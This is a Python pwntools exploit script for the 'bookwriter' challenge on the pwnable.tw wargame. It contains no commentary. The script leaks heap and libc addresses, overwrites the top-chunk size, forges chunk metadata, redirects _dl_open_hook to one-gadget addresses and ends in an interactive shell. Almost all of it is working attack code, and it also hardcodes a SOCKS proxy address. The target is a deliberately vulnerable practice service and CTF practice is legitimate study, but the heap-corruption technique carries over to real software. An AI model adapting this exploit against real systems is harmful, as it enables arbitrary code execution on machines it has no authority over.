#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
import os
context.arch="amd64"
context.log_level="debug"
pwn_file="./bookwriter"
heap_address=0
os.environ["LD_LIBRARY_PATH"]="./"
libc=ELF("./libc.so.6")

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    context.proxy=(socks.SOCKS5,"10.211.55.2",1080)
    conn=remote("chall.pwnable.tw",10304)
    pid=0

def debug():
    log.debug("libc address 0x%x"%libc.address)
    log.debug("heap address :0x%x"%heap_address)
    log.debug("process pid:%d"%pid)
    pause()

def login(name):
    conn.sendafter("Author :",name)

def add(size,content):
    conn.sendlineafter("Your choice :","1")
    conn.sendlineafter("Size of page :",str(size))
    conn.sendafter("Content :",content)

def inform(change,name=None):
    conn.sendlineafter("Your choice :","4")
    ret=conn.recvline(keepends=False)[len("Author : "):]
    if change == True:
        conn.sendlineafter("Do you want to change the author ? (yes:1 / no:0) ","1")
        login(name)
    else:
        conn.sendlineafter("Do you want to change the author ? (yes:1 / no:0) ","0")
    return ret

def show(index):
    conn.sendlineafter("Your choice :","2")
    conn.sendlineafter("Index of page :",str(index))
    conn.recvlines(2)
    ret=conn.recvuntil("\n----------------------",drop=True)
    return ret

def edit(index,name):
    conn.sendlineafter("Your choice :","3")
    conn.sendlineafter("Index of page :",str(index))
    conn.sendafter("Content:",name)

login("a"*0x40)
inform(False)
add(0x1008,"a"*0x1008)#0
heap_address=u64(inform(False)[0x40:].ljust(8,"\x00"))-0x1020

edit(0,"a"*0x1008)
edit(0,"a"*0x1008+p64(0x10fe1)[:3])
add(0x11000,"a"*0x1000)#1
edit(0,"a"*0x1008+p64(0x31fe1)[:3])

add(0x18,"a"*8)#2
libc.address=u64(show(2)[8:].ljust(8,"\x00"))-0x3c4328
add(0x20000,"a")#3
f={
    0x28:0x101,
    0x38:heap_address+0x220a0,
    0x48:0x401,
    0x58:heap_address+0x22030,
    0x90:libc.address+0x72AE7,# call [rax+0x68]
    0x98:0x421,
    0xa8:heap_address+0x220d0,
    0xc8:0x101,
    0xd8:heap_address+0x22100,
    0x90+0x58:libc.address+0xf0567,
    0x90+0x68:libc.address+0x6fd91,# call [rax+0x58]
}
edit(1,fit(f,filler="\x00"))
add(0xf0,"a")#4
f={
    0x18:0x401,
    0x28:libc.symbols["_dl_open_hook"]-0x10,
    0x38:libc.symbols["_dl_open_hook"]-0x20,
}
edit(4,fit(f,filler="\x00"))

add(0xf0,"a")
conn.sendlineafter("Your choice :","1")
conn.sendline("12")

conn.interactive()

















